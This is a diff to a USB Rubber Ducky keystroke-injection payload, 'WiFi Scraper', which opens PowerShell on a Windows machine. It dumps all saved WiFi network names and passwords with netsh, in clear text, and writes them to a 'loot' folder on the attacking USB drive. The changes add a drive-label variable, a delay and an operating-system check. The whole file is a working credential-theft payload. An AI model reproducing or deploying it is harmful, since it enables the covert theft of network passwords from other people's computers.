@@ -2,15 +2,27 @@ REM TITLE WiFi Scraper
 REM AUTHOR KryptoKola
 REM DESCRIPTION Scrapes SSID and Password information from Windows profiles.
 
+REM Defines USB Rubber Ducky Drive Label Name
+DEFINE #DRIVE_LABEL DUCKY
+
 REM Launch PowerShell Script to Scrape WiFi Information
 ATTACKMODE HID STORAGE
+
+REM Allows for PC / USB Rubber Ducky Registration.
+DELAY 2000
+
+REM Checks for Windows OS type before proceeding.
+IF ($_OS != WINDOWS)                                                                                                                                                                                                                                                     
+    STOP_PAYLOAD 
+END_IF
+
 GUI r
 DELAY 500
 STRINGLN powershell
 DELAY 1000
 STRINGLN $wifiProfiles = (netsh wlan show profiles) -match 'All User Profile\s*:\s*(.+)' | ForEach-Object {$_.Split(':')[1].Trim()}
 STRINGLN $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
-STRINGLN $lootDirectory = (Get-WmiObject win32_volume -f 'label=''DUCKY''').Name + 'loot/Wifi-Scraper/';
+STRINGLN $lootDirectory = (Get-WmiObject win32_volume -f 'label=''#DRIVE_LABEL''').Name + 'loot/Wifi-Scraper/';
 STRINGLN New-Item -Path $lootDirectory -ItemType Directory -Force | Out-Null
 STRINGLN $loot = $lootDirectory + 'wifi_loot_' + $timestamp + '.txt';
 STRINGLN $wifiProfiles | ForEach-Object {$profileName = $_;$profileInfo = netsh wlan show profile name="$profileName" key=clear;$ssidName = ($profileInfo | Select-String "SSID name" | ForEach-Object { $_.ToString().Split(':')[1].Trim() });$keyContent = ($profileInfo | Select-String "Key Content" | ForEach-Object { $_.ToString().Split(':')[1].Trim() });if ($ssidName -and $keyContent) { "$ssidName : $keyContent"}} | Out-File $loot
